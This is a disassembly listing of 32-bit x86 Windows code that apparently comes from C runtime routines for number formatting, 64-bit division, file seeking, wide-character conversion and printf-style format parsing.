shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_425eb1
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_423d36
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_433ea8
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_437f40
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_4383b0
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_4383b0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_42b5a0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_4383b0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_4382d0
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_4382d0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_4382d0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_43423b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_423619
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_433c24
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_433c24
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_433c24
push edi
push 0x30
push esi
call sub_42b5a0
add esp 0xc
sub_434332
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_438239
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_43423b
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_4380bd
add esp 0x10
cmp eax ebx
je r-xdata
sub_4343ed
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_438239
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_423d36
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_4380bd
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_433c69
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_43423b
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_4344e7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_433dd8
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434332
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_433ec8
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4343ed
jmp r-xdata
sub_43456f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4344e7
add esp 0x1c
pop ebp
retn
sub_434592
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_42a431
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_4345b3
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_4383d8
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
sub_4345de
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_43461c
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_4345de
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_434645
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_423619
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_434690
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_434725
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_43674e
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_425eb1
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_425ed7
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_4347aa
push 0x14
push r--data
call sub_42b398
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_425ec4
and [ eax ] 0x0
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
call sub_425eb1
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_42b3dd
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_4367c5
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_425ec4
mov [ eax ] edi
call sub_425eb1
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434725
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4348b9
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_4348c3
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_428905
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_43490c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_425eb1
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_423d36
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_434986
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_425eb1
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_425eb1
mov [ eax ] 0x2a
call sub_425eb1
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_425eb1
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_42b5a0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_42b5a0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_434b0f
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_428eb1
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_434b42
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_434b0f
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_434b68
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x238 ] eax
call sub_423619
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_425eb1
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
xor eax eax
cmp ebx eax
je r-xdata
push esi
call sub_42c50d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc ebx
xor eax eax
cmp [ ebp - 0x228 ] eax
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
xor esi esi
cmp [ ebp - 0x240 ] esi
je r-xdata
mov cl dl
sub cl 0x20
cmp cl 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
je r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_425eb1
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
call sub_423d36
add esp 0x14
cmp [ ebp - 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_435718 ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_434645
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x234 ] edi
test edi edi
jge r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_434b0f
jmp r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_434b0f
mov al [ ebx ]
inc ebx
mov [ ebp - 0x23c ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
